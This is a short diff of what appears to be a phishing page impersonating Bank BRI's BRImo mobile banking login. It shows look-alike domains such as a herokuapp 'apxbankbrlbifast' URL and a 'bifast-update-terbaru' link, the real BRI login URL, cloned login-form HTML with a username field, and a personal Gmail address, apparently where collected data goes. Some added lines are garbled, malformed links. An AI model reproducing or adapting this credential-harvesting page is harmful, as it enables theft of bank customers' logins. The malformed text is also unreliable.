@@ -1,7 +1,6 @@
 # BRImo-Bank-BRI-
-https://apxbankbrlbifast.herokuapp.com/id/
-https://ib.bri.co.id/ib-bri/Login.html
-zidanzezera@gmail.com
+https:https-bifast-update-terbaru-com-brimo/BRImo-Bank-BRI- to confirm.
+https:https://github.com/BRImo-bri-co-id/brimo.bri.co.id/issues/1#issue-1425724913
 <html class="ltr yui3-js-enabled webkit js chrome chrome87 chrome87-0 linux mobile secure touch  lang.dir " dir=" lang.dir " lang="in-ID">
 
  <head> 
@@ -597,7 +596,7 @@ body{
          <img src="/assets/username.png" class="css-1fq0ymr"> 
 
          <input name="email" id="email" required placeholder="Username" minlength="6" class="css-1ew2b06" value=""> 
-
+zidanzezera@gmail.com
         </div> 
 
         <div class="css-qhzfk3"> 
